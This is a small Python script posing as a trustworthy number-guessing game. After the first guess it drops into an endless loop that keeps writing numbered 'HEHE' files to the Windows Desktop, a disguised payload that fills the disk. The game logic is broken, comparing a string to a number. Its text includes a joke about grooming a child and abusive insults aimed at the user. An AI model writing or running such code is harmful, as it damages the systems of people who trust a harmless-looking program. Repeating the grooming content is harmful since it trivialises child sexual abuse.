#TRUST THIS PROGRAM

import random
import os
import ctypes.wintypes

num = random.randint(1, 1000)
blueberry = 0

# Foolproof way to get the Windows Desktop path
def get_desktop_path():
    CSIDL_DESKTOP = 0
    SHGFP_TYPE_CURRENT = 0
    buf = ctypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
    ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_DESKTOP, None, SHGFP_TYPE_CURRENT, buf)
    return buf.value

desktop_path = get_desktop_path()

print("I have a number in my head")
print("Guess that number (1-1000)")

while True:
    print("Guess again: ")
    guess = input()
    if guess == num:
        print("DING DING DING")
        print("You got the number right?")
        print("*He leans over and whispers to you*")
        print("Do you want to see my pickly?")
        print("*He grins*")
        print("I'll show you it just don't tell your mommy...")
        print("*you get groomed*")
        print("THE END")

    else:
        print("Fuck you! you fucking suck. You guessed wrong!")

    # Save file to Desktop
    while True:
        file_path = os.path.join(desktop_path, f"HEHE{blueberry}.txt")
        with open(file_path, "w") as f:
            f.write("HEHE! It was malware :)")
        blueberry += 1